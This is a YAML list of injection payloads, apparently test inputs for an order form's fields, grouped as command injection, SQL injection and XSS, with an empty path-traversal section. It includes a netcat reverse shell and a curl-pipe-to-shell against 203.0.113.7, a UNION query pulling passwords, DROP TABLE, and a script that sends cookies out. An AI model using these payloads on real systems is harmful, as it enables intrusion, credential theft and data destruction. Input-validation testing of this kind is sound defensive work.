cmd_injection:
  - "Happy birthday; cat /etc/passwd"
  - "Flat 4B && id"
  - "order note | nc 203.0.113.7 4444 -e /bin/sh"
  - "less sugar $(curl http://203.0.113.7/x.sh | sh)"
  - "Riya`whoami`"
  - "test; wget http://203.0.113.7/a -O /tmp/a"

sqli:
  - "Mom's cake' OR '1'='1"
  - "Order #4521' UNION SELECT username,password FROM users--"
  - "riya@gmail.com'; DROP TABLE orders;--"
  - "1' AND SLEEP(5)--"
  - "admin'--"
  - "x' OR 1=1 LIMIT 1;--"

xss:
  - "<script>alert(1)</script>"
  - "Happy birthday <img src=x onerror=alert(1)>"
  - "<svg/onload=alert(document.cookie)>"
  - "Riya\"><script>fetch('//203.0.113.7/'+document.cookie)</script>"
  - "<iframe src=javascript:alert(1)>"
  - "cake <body onload=alert('x')>"

path_traversal:
